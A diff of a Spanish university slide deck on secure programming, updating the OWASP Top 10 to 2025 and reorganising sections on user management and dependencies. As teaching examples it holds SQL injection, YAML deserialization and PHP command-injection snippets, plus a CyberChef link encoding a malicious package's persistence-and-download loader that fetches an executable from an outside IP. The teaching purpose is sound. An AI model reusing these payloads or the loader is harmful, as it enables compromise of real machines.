@@ -31,11 +31,11 @@ Juan Vera del Campo - <juan.vera@professor.universidadviu.com>
 <!-- _class: cool-list toc -->
 
 1. [Errores de código más comunes](#4)
-1. [Secure System Design Principles](#11)
-1. [Recomendaciones y ejemplos en Python](#29)
-1. [Gestión de usuarios](#40)
-1. [Proyectos, librerías y dependencias](#51)
-1. [Referencias](#67)
+1. [Buenas prácticas](#12)
+1. [Gestión de usuarios](#20)
+1. [Proyectos, librerías y dependencias](#33)
+1. [VibeCoding with Artificial Intelligence](#47)
+1. [Referencias](#51)
 
 # Errores de código más comunes
 <!-- _class: lead -->
@@ -63,19 +63,19 @@ Entre sus guías, incluye el top ten de vulnerabilidades que debemos evitar en n
 
 ---
 
-1. [Broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/): usuarios capaces de hacer cosas a las que no deberían estar autorizados. Defensa: denegación por defecto
-1. [Cryptographic failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/): protección definiciente de los datos en tránsito y almacenados. Defensa: políticas de datos
-1. [Injection](https://owasp.org/Top10/A03_2021-Injection/): el usuario puede forzar la ejecución de comandos. Defensa: librerías especializadas, validación de entradas
-1. [Diseño inseguro](https://owasp.org/Top10/A04_2021-Insecure_Design/). Defensa: Threat Modeling.
-1. [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) Defensa: system hardening
+1. [Broken access control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/): usuarios capaces de hacer cosas a las que no deberían estar autorizados. Defensa: denegación por defecto
+1. [Security Misconfiguration](https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/) Defensa: system hardening
+1. [Software Supply Chain Failures](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/): uso de librerías vulnerables. Defensa: auditorías
+1. [Cryptographic failures](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/): protección definiciente de los datos en tránsito y almacenados. Defensa: políticas de datos
+1. [Injection](https://owasp.org/Top10/2025/A05_2025-Injection/): el usuario puede forzar la ejecución de comandos. Defensa: librerías especializadas, validación de entradas
 
 ---
 
-6. [Vulnerable components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/): uso de librerías vulnerables. Defensa: auditorías
-1. [Identification failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/). Atacantes entrando por fuerza bruta. Ejemplo de defensa: 2FA
-1. [Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) No comprobar si los plugins son maliciosos. Defensa: firma digital
-1. [Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/) No registrar las acciones de los usuarios. Defensa: sistemas de gestión de logs
-1. [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) Obligar al servidor a acceder a datos en su nombre. Defensa: validación de entrada
+6. [Diseño inseguro](https://owasp.org/Top10/2025/A06_2025-Insecure_Design/). Defensa: Threat Modeling.
+1. [Authentication failures](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/). Atacantes entrando por fuerza bruta. Ejemplo de defensa: 2FA
+1. [Integrity Failures](https://owasp.org/Top10/2025/A08_2025-Software_or_Data_Integrity_Failures/) No comprobar qué estamos ejecutando
+1. [Monitoring Failures](https://owasp.org/Top10/2025/A09_2025-Security_Logging_and_Alerting_Failures/) Errores en la gestión de alertas y logs
+1. [Exceptional Conditions](https://owasp.org/Top10/2025/A10_2025-Mishandling_of_Exceptional_Conditions/) Errores en la gestión de los propios errores
 
 ## Otros proyectos
 
@@ -85,7 +85,7 @@ Entre sus guías, incluye el top ten de vulnerabilidades que debemos evitar en n
 OWASP tiene otros proyectos
 
 - API Top 10: https://owasp.org/www-project-api-security/
-- Checklist Mobile testing: https://owasp.org/www-project-mobile-security-testing-guide/
+- Top 10 en LLMs <https://owasp.org/www-project-top-10-for-large-language-model-applications/>
 - Top 10 en programación de dispositivos móviles <https://owasp.org/www-project-mobile-top-10/>
 
 ## Otras recomendaciones: SANS Top25
@@ -113,212 +113,8 @@ Rank|ID|Name
 
 > https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html
 
-# Secure System Design Principles
-<!-- _class: lead -->
 
-"The Protection of Information in Computer Systems", JEROME H. SALTZER and MICHAEL D. SCHROEDER, 1974
-
-## Sistemas simples
-
-*As systems get more complex, security will get worse* (Bruce Schneier)
-
-*Keeping it simple, stupid!* (simpler said than done)
-
-- Diseños lo más simples y pequeños posible (Principio KISS)
-- Reducir el número de componentes utilizados, conservando sólo aquellos que sean esenciales
-- Servicios y aplicaciones deshabilitados de forma predeterminada
-
-- CWE:
-    - https://cwe.mitre.org/data/definitions/561.html
-    - https://cwe.mitre.org/data/definitions/637.html
-
-> https://es.wikipedia.org/wiki/Principio_KISS
-
-## Guías de estilo (linters)
-
-- Tienes que entender el código de otro para poder decidir si es seguro o no
-- En dos semanas, no entenderás tu propio código
-- Los lenguajes que dan mucha libertad pueden provocar que cada programador escriba de una manera
-- Todos los programadores del equipo deben seguir las mismas reglas
-
-Ejemplos:
-
-- https://pep8.org/
-- https://google.github.io/styleguide/pyguide.html
-- https://sphinxcontrib-napoleon.readthedocs.io/en/latest/example_google.html
-
-<!--
-Para forzar las mismas reglas en toda la empresa, puedes utilizar linters: no permitirán que un código compile o se suba a git si no sigue las reglas de la empresa
-
-PEP8 es un ejemplo de reglas. Hay muchos más. Los linters los puedes encontrar para cada lenguaje. Ejemplos en Python: pylama, frake8. Ejemplos en Javascript: eslint
--->
-
----
-
-![center](images/coding/code-linting.png)
-
-## Valida lo que dice el usuario
-
-- Verifica que todos los datos recibidos cumplan con las propiedades o tipos de datos esperados
-- Mucho cuidado con permitir entender las entradas de los usuarios como código
-- Top 10 de OWASP y SANS
-
-- CWE:
-    - https://cwe.mitre.org/data/definitions/710.html
-    - https://cwe.mitre.org/data/definitions/1006.html
-
----
-
-![center h:20em](images/coding/validation-example.png)
-
-El bug no es obvio: si `file` es un path absoluto, ignora los paths anteriores: <https://docs.python.org/3/library/os.path.html>
-
-## Secure by default
-
-La configuración por defecto tiene que ser "acceso prohibido"
-
-Ejemplo:
-
-- No permitas acceso sin autenticación
-- No des información privada a personas no autenticadas
-- Política de contraseñas
-- Usa cifrado por defecto
-
-- CWE:
-    - https://cwe.mitre.org/data/definitions/276.html
-    - https://cwe.mitre.org/data/definitions/636.html
-
-## Complete Mediation
-
-- Para cada acceso a cada objeto verifica que el usuario tiene los permisos adecuado
-- Verificar los permisos implica que el usuario tiene que estar autenticado en el sistema
-
-- CWE:
-    - https://cwe.mitre.org/data/definitions/862.html
-    - https://cwe.mitre.org/data/definitions/638.html
-
----
-
-![center h:20em](images/coding/mediation-example.png)
-
-## Open Design
-
-- La seguridad del sistema no debe depender de su secreto
-- Evita la "seguridad por oscuridad"
-- En software comercial: reviews internas del código
-
-- CWE:
-    - https://cwe.mitre.org/data/definitions/259.html
-    - https://cwe.mitre.org/data/definitions/656.html
-
----
-
-```python
-SECRET_PASSWORD = "SuperSecreta123".reverse()
-
-def autenticar(usuario, contrasena):
-    if usuario == "admin" and contrasena == SECRET_PASSWORD:
-        return True
-    return False
-```
-
-## Isolated compartments
-
-- Contenedores que gestionen o impidan la comunicación entre componentes y la fuga de información y el control.
-- Restringe la comunicación autorizada entre componentes a rutas observables con interfaces definidas
-- Aislamiento de procesos y memoria, particiones de disco, virtualización, protecciones de software, zonas, puertas de enlace, firewalls, docker, kubernetes
-
-- CWE:
-    - https://cwe.mitre.org/data/definitions/901.html
-    - https://cwe.mitre.org/data/definitions/653.html
-
-## Least Privilege
-
-- Usa los privilegios mínimos necesarios para una tarea y durante el menor tiempo necesario
-- Usa revocación de privilegios cuando ya no sean necesarios
-- Los roles deben ser revisados, acordados y auditados periódicamente
-
-- CWE:
-    - https://cwe.mitre.org/data/definitions/269.html
-    - https://cwe.mitre.org/data/definitions/250.html
-
----
-
-```javascript
-function authenticateUsers(username, password) {
-    var accounts = apiService.sql("SELECT * FROM users");
-    for(var i=0, i<accounts.length; i++) {
-        var account = account[i];
-        if(account.username === username && account.password === password) {
-            return true;
-        }
-        if ("true" === "true") {
-            return false;
-        }
-    }
-}
-$("#login").click(function () {
-    var username = $("#username").val();
-    var password = $("#password").val();
-    var authenticated = authenticatedUser(username, password);
-    if (authenticated === true) {
-        $.cookie('loggedin', 'yes', {expires: 1});
-    } else if (authenticated === false) {
-        $("error_message").show(LogIn Failed);
-    }
-});
-```
-
-> https://twitter.com/hot_girl_spring/status/1853430439022670236
-
-<!--
-This code snippet contains several issues that indicate a lack of experience, which is likely why it was shared with the caption, "I don't think the intern will last much longer." Here are some specific issues:
-
-Potential SQL Injection: The code uses apiService.sql("SELECT * FROM users") to retrieve user data. If apiService.sql doesn't implement SQL injection protection, this approach could expose the database to attacks. Typically, prepared statements or ORM (Object-Relational Mapping) tools are used to avoid this risk.
-
-Inefficient Authentication Logic: The authenticateUser function iterates through all user accounts in the database (for (var i = 0; i < accounts.length; i++)). In a real-world application, fetching all user records to find a single match is highly inefficient and poses security risks by unnecessarily loading all user data.
-
-Hardcoded Condition Always Returning False: At the end of authenticateUser, there's an if ("true" === "true") { return false; } condition, which always evaluates to true and will always return false, regardless of whether the user credentials are correct. This effectively prevents any user from logging in successfully, making the authentication function useless.
-
-Unsecure Cookie Storage: The code uses $.cookie('loggedin', 'yes', { expires: 1 }); to set a login cookie without any additional security configurations, such as HttpOnly or Secure flags. This makes the cookie vulnerable to client-side manipulation or interception in non-HTTPS contexts.
-
-Potential Incorrect Error Handling: The line $("error_message").show(LogIn Failed) appears to be missing proper syntax for displaying the error message. It should likely be $("#error_message").show("Login Failed");, where # selects the element by ID, and "Login Failed" should be wrapped in quotes.
-
-These issues are commonly made by beginners and can lead to performance problems and significant security vulnerabilities, which is likely why the post humorously suggests that "the intern won't last much longer."
--->
-
-## Evidence Production
-
-- Registra las actividades del sistema
-- Deben existir controles suficientes para que se pueda hacer cumplir la responsabilidad de los usuarios y sistemas
-
-- CWE:
-    - https://cwe.mitre.org/data/definitions/778.html
-    - https://cwe.mitre.org/data/definitions/693.html
-
-
-## Aprende con malos ejemplos
-
-- [C# Bad Practices: Learn How to Make Good Code by Using Examples of Bad Code](https://www.codeproject.com/Articles/1083348/Csharp-Bad-Practices-Learn-How-to-Make-Good-Code-b)
-- [For every 10 likes this gets, I will ask ChatGPT to make this code more insecure](https://twitter.com/LiveOverflow/status/1729798452094128278)
-
-<!--
-Los ejemplos de esta página son una buena introducción a las "reglas de oro" que se discuten en el resto de la sesión. Es muy recomendable visitar esa página durante la sesión, y los alumnos después de ella.
--->
-
-## Referencias y resúmenes
-
-- In Defense of Clean Code: 100+ pieces of timeless advice from Uncle Bob : https://dev.to/thawkin3/in-defense-of-clean-code-100-pieces-of-timeless-advice-from-uncle-bob-5flk
-
-- It's probably time to stop recommending Clean Code: https://qntm.org/clean
-
-- https://cwe.mitre.org/data/definitions/1006.html#:~:text=CWE%20CATEGORY%3A%20Bad%20Coding%20Practices&text=If%20a%20program%20is%20complex,are%20buried%20in%20the%20code
-
-- <https://www.redhat.com/en/blog/security-design-security-principles-and-threat-modeling>
-
-- https://github.com/OWASP/DevGuide/blob/master/02-Design/01-Principles%20of%20Security%20Engineering.md
-
-# Recomendaciones y ejemplos en Python
+# Buenas prácticas
 <!-- _class: lead -->
 
 ## Recomendaciones
@@ -345,6 +141,8 @@ Los ejemplos de esta página son una buena introducción a las "reglas de oro" q
 5. **Gestión de librerías** seguras y probadas
 6. **Usable**
 7. **Acceso denegado por defecto**
+8. **Registra todas las acciones** (logging)
+9. **Usa guías de estilo** (linters)
 10. **Control de calidad** (ver siguiente temas)
 
 
@@ -369,7 +167,7 @@ Los ejemplos de esta página son una buena introducción a las "reglas de oro" q
 
 -->
 
-## No te fíes de nadie
+## Input validation
 
 Siempre tienes que "sanitizar" cualquier *input* del usuario
 
@@ -402,46 +200,27 @@ Pero...
 En el caso particular de esta función, no pasa nada: la función no permite atajos de shell. Pero tienes que tenerlo en cuenta para tus funciones∫
 -->
 
-## Ataques de templates
+##  Input validation: injection
 
-```python
-import yaml
+Ejemplo con SQL injection:
 
-input = '''
-title: Título de Prueba
-alumnos:
-    - María
-    - Eva
-    - Alberto
-    - Jorge
-'''
-
-clase = yaml.load(input, yaml.BaseLoader)
-print(clase['alumnos'])
-
-# Salida: ['María', 'Eva', 'Alberto', 'Jorge']
+```
+txtUserId = getRequestString("UserId");
+txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;
 ```
 
-- <https://cwe.mitre.org/data/definitions/502.html>
+Si, por ejemplo, `UserId=5`, el comando devolverá los datos del usuario 5
 
----
+Si un atacante es capaz de asignar `UserId= "105 OR 1=1"`...
 
-```python
-import yaml
+Se ejecutará: `SELECT * FROM Users WHERE UserId = 105 OR 1=1;`
 
-input = '!!python/object/new:sys.exit [42]'
-yaml.load(input, Loader=yaml.UnsafeLoader)
-```
+¡Este comando devuelve toda la base de datos!
 
-¿Cuál es la salida de este comando?
+> https://www.w3schools.com/sql/sql_injection.asp
 
-> https://theconversation.com/what-is-log4j-a-cybersecurity-expert-explains-the-latest-internet-vulnerability-how-bad-it-is-and-whats-at-stake-173896
 
-<!--
-Un ejemplo de esta vulnerabildad que nos tuvo varias semanas pegados a la pantalla en 2021 fue log4j
--->
-
-## Loguea todo
+## Registra todas las acciones
 
 No uses `print()`, sinó el módulo *logging* (Java: *log4j*)
 
@@ -465,89 +244,34 @@ Estas librerías especializadas permiten configurar la salida de log. Por ejempl
 Y los logs de aplicación puedes fácilmente centralizarlos en un SIEM
 -->
 
-## Comprueba permisos
+## Guías de estilo (linters)
 
-Prefiero pedir perdón que permiso:
+- Tienes que entender el código de otro para poder decidir si es seguro o no
+- En dos semanas, no entenderás tu propio código
+- Los lenguajes que dan mucha libertad pueden provocar que cada programador escriba de una manera
+- Todos los programadores del equipo deben seguir las mismas reglas
 
-```python
-try:
-    file = open(path_to_file)
-except PermissionError:
-    return None
-    with file:
-        return file.read()
-```
+Ejemplos:
 
-Mira antes de cruzar:
-
-```python
-if os.path(path_to_file, os.R_OK):
-    with open(Path_to_file) as file:
-        return file.read()
-return None
-```
+- https://pep8.org/
+- https://google.github.io/styleguide/pyguide.html
+- https://sphinxcontrib-napoleon.readthedocs.io/en/latest/example_google.html
 
 <!--
-Ambas son buenas soluciones, depende de tus preferencias. Pero tienes que implementar alguna de ellas
+Para forzar las mismas reglas en toda la empresa, puedes utilizar linters: no permitirán que un código compile o se suba a git si no sigue las reglas de la empresa
+
+PEP8 es un ejemplo de reglas. Hay muchos más. Los linters los puedes encontrar para cada lenguaje. Ejemplos en Python: pylama, frake8. Ejemplos en Javascript: eslint
 -->
 
-## Archivos temporales
+---
 
-No los gestiones tú: usa las librerías del propio lenguaje
+![center](images/coding/code-linting.png)
 
-```python
-from tempfile import TemporaryFile
-
-with TemporaryFile() as tmp:
-    tmp.write(...)
-```
-
-No hagas:
-
-```python
-with open('borrame.temp') as tmp:
-    tmp.write(...)
-os.unlink('borrame.temp')
-```
-
-> https://rules.sonarsource.com/python/type/Vulnerability/RSPEC-5445
-
-<!--
-Fíjate: en caso de error en el segundo ejemplo, el archivo no se borrará nunca. Además, el programa no puede ejecutarse en paralelo: dos ejecuciones concurrentes trabajarán sobre el mismo archivo.
--->
-
-##  SQL injection
-
-```
-txtUserId = getRequestString("UserId");
-txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;
-```
-
-Sim, por ejemplo, `UserId=5`, el comando devolverá los datos del usuario 5
-
-Si un atacante es capaz de asignar `UserId= "105 OR 1=1"`...
-
-Se ejecutará: `SELECT * FROM Users WHERE UserId = 105 OR 1=1;`
-
-¡Este comando devuelve toda la base de datos!
-
-> https://www.w3schools.com/sql/sql_injection.asp
-
-## Command injection
-<!-- _class: two-columns -->
-
-```php
-<?php
-
-$command = "ls ".$_GET['modifiers'];
-
-$output = exec($command);
-```
-
-![](images/coding/commandinjection.png)
 
 # Gestión de usuarios
 <!-- _class: lead -->
+
+Broken Access
 
 ## Cosas a tener en cuenta
 
@@ -669,10 +393,6 @@ async def create_user(
 
 ---
 
-![](images/coding/server-autodocs.png)
-
----
-
 ```python
 def get_current_username(
     credentials: Annotated[HTTPBasicCredentials, Depends(security)]
@@ -708,8 +428,6 @@ def get_current_username(
 ![center w:25em](images/coding/demos2.png)
 
 -->
-
-
 
 ## Gestión de usuarios logueados
 
@@ -775,10 +493,45 @@ DATABASE_PASSWORD = os.environ.get("DATABASE_PASSWORD")
 - Considera leer de memoria: `DATABASE_PASSWORD = os.environ.get("DATABASE_PASSWORD")`
 - Conexión a la base de datos dentro del código: <https://cwe.mitre.org/data/definitions/540.html>
 
+## Secure by default
 
+La configuración por defecto tiene que ser "acceso prohibido"
+
+Ejemplo:
+
+- No permitas acceso sin autenticación
+- No des información privada a personas no autenticadas
+- Política de contraseñas
+- Usa cifrado por defecto
+
+- CWE:
+    - https://cwe.mitre.org/data/definitions/276.html
+    - https://cwe.mitre.org/data/definitions/636.html
+
+
+## Complete Mediation
+
+- Para cada acceso a cada objeto verifica que el usuario tiene los permisos adecuados
+- Verificar los permisos implica que el usuario tiene que estar autenticado en el sistema
+
+- CWE:
+    - https://cwe.mitre.org/data/definitions/862.html
+    - https://cwe.mitre.org/data/definitions/638.html
+
+## Least Privilege
+
+- Usa los privilegios mínimos necesarios para una tarea y durante el menor tiempo necesario
+- Usa revocación de privilegios cuando ya no sean necesarios
+- Los roles deben ser revisados, acordados y auditados periódicamente
+
+- CWE:
+    - https://cwe.mitre.org/data/definitions/269.html
+    - https://cwe.mitre.org/data/definitions/250.html
 
 # Proyectos, librerías y dependencias
 <!-- _class: lead -->
+
+Supply Chain Attacks
 
 
 ## Creación del proyecto
@@ -866,10 +619,10 @@ Pero esa línea 17 en realidad oculta otro comando después de muchos espacios. 
 
 Si analizamos qué hace este código: añade un archivo a Windows que se ejecuta siempre que el usuario abre una nueva sesión en su PC
 
-![](images/coding/pytolib4.png)
+![w:25em center](images/coding/pytolib4.png)
 
 
-[](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Syntax_highlighter('powershell')&input=YVcxd2IzSjBJRzl6Q21sdGNHOXlkQ0J6ZFdKd2NtOWpaWE56Q214dloybHVJRDBnYjNNdVoyVjBiRzluYVc0b0tRcHBaaUJ2Y3k1d1lYUm9MbVY0YVhOMGN5aG1KME02WEZ4VmMyVnljMXhjZTJ4dloybHVmVnhjUVhCd1JHRjBZVnhjVW05aGJXbHVaMXhjVFdsamNtOXpiMlowWEZ4WGFXNWtiM2R6WEZ4VGRHRnlkQ0JOWlc1MVhGeFFjbTluY21GdGMxeGNVM2x6ZEdWdE9EWmNYQ2NwSUQwOUlFWmhiSE5sT2dvS0lDQWdJRzl6TG0xclpHbHlLR1lpUXpwY1hGVnpaWEp6WEZ4N2JHOW5hVzU5WEZ4QmNIQkVZWFJoWEZ4U2IyRnRhVzVuWEZ4TmFXTnliM052Wm5SY1hGZHBibVJ2ZDNOY1hGTjBZWEowSUUxbGJuVmNYRkJ5YjJkeVlXMXpYRnhUZVhOMFpXMDROaUlwQ2lBZ0lDQnZjR1Z1S0dZaVF6cGNYRlZ6WlhKelhGeDdiRzluYVc1OVhGeEJjSEJFWVhSaFhGeFNiMkZ0YVc1blhGeE5hV055YjNOdlpuUmNYRmRwYm1SdmQzTmNYRk4wWVhKMElFMWxiblZjWEZCeWIyZHlZVzF6WEZ4VGVYTjBaVzA0Tmx4Y1YwbE9Nekl1ZG1Keklpd2dJbUVpS1M1M2NtbDBaU2htSjFObGRDQlhjMmhUYUdWc2JDQTlJRU55WldGMFpVOWlhbVZqZENnaVYxTmpjbWx3ZEM1VGFHVnNiQ0lwSUZ4dVYzTm9VMmhsYkd3dVVuVnVJR05vY2lnek5Da2dKaUFpUXpwY1hGVnpaWEp6WEZ4N2JHOW5hVzU5WEZ4QmNIQkVZWFJoWEZ4U2IyRnRhVzVuWEZ4TmFXTnliM052Wm5SY1hGZHBibVJ2ZDNOY1hGTjBZWEowSUUxbGJuVmNYRkJ5YjJkeVlXMXpYRnhUZVhOMFpXMDRObHhjVjBsT016SXVZbUYwSWlBbUlFTm9jaWd6TkNrc0lEQmNibE5sZENCWGMyaFRhR1ZzYkNBOUlFNXZkR2hwYm1jbktRb2dJQ0FnYjNCbGJpaG1Ja002WEZ4VmMyVnljMXhjZTJ4dloybHVmVnhjUVhCd1JHRjBZVnhjVW05aGJXbHVaMXhjVFdsamNtOXpiMlowWEZ4WGFXNWtiM2R6WEZ4VGRHRnlkQ0JOWlc1MVhGeFFjbTluY21GdGMxeGNVM2x6ZEdWdE9EWmNYRmRKVGpZMExuWmljeUlzSUNKaElpa3VkM0pwZEdVb1ppZFRaWFFnVjNOb1UyaGxiR3dnUFNCRGNtVmhkR1ZQWW1wbFkzUW9JbGRUWTNKcGNIUXVVMmhsYkd3aUtTQmNibGR6YUZOb1pXeHNMbEoxYmlCamFISW9NelFwSUNZZ0lrTTZYRnhWYzJWeWMxeGNlMnh2WjJsdWZWeGNRWEJ3UkdGMFlWeGNVbTloYldsdVoxeGNUV2xqY205emIyWjBYRnhYYVc1a2IzZHpYRnhUZEdGeWRDQk5aVzUxWEZ4UWNtOW5jbUZ0YzF4Y1UzbHpkR1Z0T0RaY1hGSjFiblJwYldVdVpYaGxJaUFtSUVOb2NpZ3pOQ2tzSURCY2JsTmxkQ0JYYzJoVGFHVnNiQ0E5SUU1dmRHaHBibWNuS1FvS0lDQWdJRzl3Wlc0b1ppSkRPbHhjVlhObGNuTmNYSHRzYjJkcGJuMWNYRUZ3Y0VSaGRHRmNYRkp2WVcxcGJtZGNYRTFwWTNKdmMyOW1kRnhjVjJsdVpHOTNjMXhjVTNSaGNuUWdUV1Z1ZFZ4Y1VISnZaM0poYlhOY1hGTjVjM1JsYlRnMlhGeFhTVTR6TWk1aVlYUWlMQ0FpWVNJcExuZHlhWFJsS0dZbkp5ZGlhWFJ6WVdSdGFXNGdMM1J5WVc1elptVnlJRzE1Wkc5M2JteHZZV1JxYjJJZ0wyUnZkMjVzYjJGa0lDOXdjbWx2Y21sMGVTQkdUMUpGUjFKUFZVNUVJQ0pvZEhSd09pOHZOVEV1TnpjdU1UUXdMakUwTkRvNE1EZzJMMlJzTDNKMWJuUnBiV1VpSUNKRE9seGNWWE5sY25OY1hIdHNiMmRwYm4xY1hFRndjRVJoZEdGY1hGSnZZVzFwYm1kY1hFMXBZM0p2YzI5bWRGeGNWMmx1Wkc5M2MxeGNVM1JoY25RZ1RXVnVkVnhjVUhKdlozSmhiWE5jWEZONWMzUmxiVGcyWEZ4U2RXNTBhVzFsTG1WNFpTSmNibk4wWVhKMElDSWlJQ0pET2x4Y1ZYTmxjbk5jWEh0c2IyZHBibjFjWEVGd2NFUmhkR0ZjWEZKdllXMXBibWRjWEUxcFkzSnZjMjltZEZ4Y1YybHVaRzkzYzF4Y1UzUmhjblFnVFdWdWRWeGNVSEp2WjNKaGJYTmNYRk41YzNSbGJUZzJYRnhTZFc1MGFXMWxMbVY0WlNJbkp5Y3BDaUFnSUNCemRXSndjbTlqWlhOekxuSjFiaWhtSWtNNlhGeFZjMlZ5YzF4Y2UyeHZaMmx1ZlZ4Y1FYQndSR0YwWVZ4Y1VtOWhiV2x1WjF4Y1RXbGpjbTl6YjJaMFhGeFhhVzVrYjNkelhGeFRkR0Z5ZENCTlpXNTFYRnhRY205bmNtRnRjMXhjVTNsemRHVnRPRFpjWEZkSlRqTXlMblppY3lJc0lITm9aV3hzUFZSeWRXVXNJR05vWldOclBWUnlkV1VwQ2lBZ0lDQUtaV3h6WlRvZ0lDQUtJQ0FnSUhCaGMzTT0)
+[Análisis en Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Syntax_highlighter('powershell')&input=YVcxd2IzSjBJRzl6Q21sdGNHOXlkQ0J6ZFdKd2NtOWpaWE56Q214dloybHVJRDBnYjNNdVoyVjBiRzluYVc0b0tRcHBaaUJ2Y3k1d1lYUm9MbVY0YVhOMGN5aG1KME02WEZ4VmMyVnljMXhjZTJ4dloybHVmVnhjUVhCd1JHRjBZVnhjVW05aGJXbHVaMXhjVFdsamNtOXpiMlowWEZ4WGFXNWtiM2R6WEZ4VGRHRnlkQ0JOWlc1MVhGeFFjbTluY21GdGMxeGNVM2x6ZEdWdE9EWmNYQ2NwSUQwOUlFWmhiSE5sT2dvS0lDQWdJRzl6TG0xclpHbHlLR1lpUXpwY1hGVnpaWEp6WEZ4N2JHOW5hVzU5WEZ4QmNIQkVZWFJoWEZ4U2IyRnRhVzVuWEZ4TmFXTnliM052Wm5SY1hGZHBibVJ2ZDNOY1hGTjBZWEowSUUxbGJuVmNYRkJ5YjJkeVlXMXpYRnhUZVhOMFpXMDROaUlwQ2lBZ0lDQnZjR1Z1S0dZaVF6cGNYRlZ6WlhKelhGeDdiRzluYVc1OVhGeEJjSEJFWVhSaFhGeFNiMkZ0YVc1blhGeE5hV055YjNOdlpuUmNYRmRwYm1SdmQzTmNYRk4wWVhKMElFMWxiblZjWEZCeWIyZHlZVzF6WEZ4VGVYTjBaVzA0Tmx4Y1YwbE9Nekl1ZG1Keklpd2dJbUVpS1M1M2NtbDBaU2htSjFObGRDQlhjMmhUYUdWc2JDQTlJRU55WldGMFpVOWlhbVZqZENnaVYxTmpjbWx3ZEM1VGFHVnNiQ0lwSUZ4dVYzTm9VMmhsYkd3dVVuVnVJR05vY2lnek5Da2dKaUFpUXpwY1hGVnpaWEp6WEZ4N2JHOW5hVzU5WEZ4QmNIQkVZWFJoWEZ4U2IyRnRhVzVuWEZ4TmFXTnliM052Wm5SY1hGZHBibVJ2ZDNOY1hGTjBZWEowSUUxbGJuVmNYRkJ5YjJkeVlXMXpYRnhUZVhOMFpXMDRObHhjVjBsT016SXVZbUYwSWlBbUlFTm9jaWd6TkNrc0lEQmNibE5sZENCWGMyaFRhR1ZzYkNBOUlFNXZkR2hwYm1jbktRb2dJQ0FnYjNCbGJpaG1Ja002WEZ4VmMyVnljMXhjZTJ4dloybHVmVnhjUVhCd1JHRjBZVnhjVW05aGJXbHVaMXhjVFdsamNtOXpiMlowWEZ4WGFXNWtiM2R6WEZ4VGRHRnlkQ0JOWlc1MVhGeFFjbTluY21GdGMxeGNVM2x6ZEdWdE9EWmNYRmRKVGpZMExuWmljeUlzSUNKaElpa3VkM0pwZEdVb1ppZFRaWFFnVjNOb1UyaGxiR3dnUFNCRGNtVmhkR1ZQWW1wbFkzUW9JbGRUWTNKcGNIUXVVMmhsYkd3aUtTQmNibGR6YUZOb1pXeHNMbEoxYmlCamFISW9NelFwSUNZZ0lrTTZYRnhWYzJWeWMxeGNlMnh2WjJsdWZWeGNRWEJ3UkdGMFlWeGNVbTloYldsdVoxeGNUV2xqY205emIyWjBYRnhYYVc1a2IzZHpYRnhUZEdGeWRDQk5aVzUxWEZ4UWNtOW5jbUZ0YzF4Y1UzbHpkR1Z0T0RaY1hGSjFiblJwYldVdVpYaGxJaUFtSUVOb2NpZ3pOQ2tzSURCY2JsTmxkQ0JYYzJoVGFHVnNiQ0E5SUU1dmRHaHBibWNuS1FvS0lDQWdJRzl3Wlc0b1ppSkRPbHhjVlhObGNuTmNYSHRzYjJkcGJuMWNYRUZ3Y0VSaGRHRmNYRkp2WVcxcGJtZGNYRTFwWTNKdmMyOW1kRnhjVjJsdVpHOTNjMXhjVTNSaGNuUWdUV1Z1ZFZ4Y1VISnZaM0poYlhOY1hGTjVjM1JsYlRnMlhGeFhTVTR6TWk1aVlYUWlMQ0FpWVNJcExuZHlhWFJsS0dZbkp5ZGlhWFJ6WVdSdGFXNGdMM1J5WVc1elptVnlJRzE1Wkc5M2JteHZZV1JxYjJJZ0wyUnZkMjVzYjJGa0lDOXdjbWx2Y21sMGVTQkdUMUpGUjFKUFZVNUVJQ0pvZEhSd09pOHZOVEV1TnpjdU1UUXdMakUwTkRvNE1EZzJMMlJzTDNKMWJuUnBiV1VpSUNKRE9seGNWWE5sY25OY1hIdHNiMmRwYm4xY1hFRndjRVJoZEdGY1hGSnZZVzFwYm1kY1hFMXBZM0p2YzI5bWRGeGNWMmx1Wkc5M2MxeGNVM1JoY25RZ1RXVnVkVnhjVUhKdlozSmhiWE5jWEZONWMzUmxiVGcyWEZ4U2RXNTBhVzFsTG1WNFpTSmNibk4wWVhKMElDSWlJQ0pET2x4Y1ZYTmxjbk5jWEh0c2IyZHBibjFjWEVGd2NFUmhkR0ZjWEZKdllXMXBibWRjWEUxcFkzSnZjMjltZEZ4Y1YybHVaRzkzYzF4Y1UzUmhjblFnVFdWdWRWeGNVSEp2WjNKaGJYTmNYRk41YzNSbGJUZzJYRnhTZFc1MGFXMWxMbVY0WlNJbkp5Y3BDaUFnSUNCemRXSndjbTlqWlhOekxuSjFiaWhtSWtNNlhGeFZjMlZ5YzF4Y2UyeHZaMmx1ZlZ4Y1FYQndSR0YwWVZ4Y1VtOWhiV2x1WjF4Y1RXbGpjbTl6YjJaMFhGeFhhVzVrYjNkelhGeFRkR0Z5ZENCTlpXNTFYRnhRY205bmNtRnRjMXhjVTNsemRHVnRPRFpjWEZkSlRqTXlMblppY3lJc0lITm9aV3hzUFZSeWRXVXNJR05vWldOclBWUnlkV1VwQ2lBZ0lDQUtaV3h6WlRvZ0lDQUtJQ0FnSUhCaGMzTT0)
 
 ---
 
@@ -889,49 +642,57 @@ El atacante recomendaba instalar su librería en respuestas en sourceforge (come
 - [State of Dependency Management (2023)](https://www.endorlabs.com/learn/state-of-dependency-management-2023)
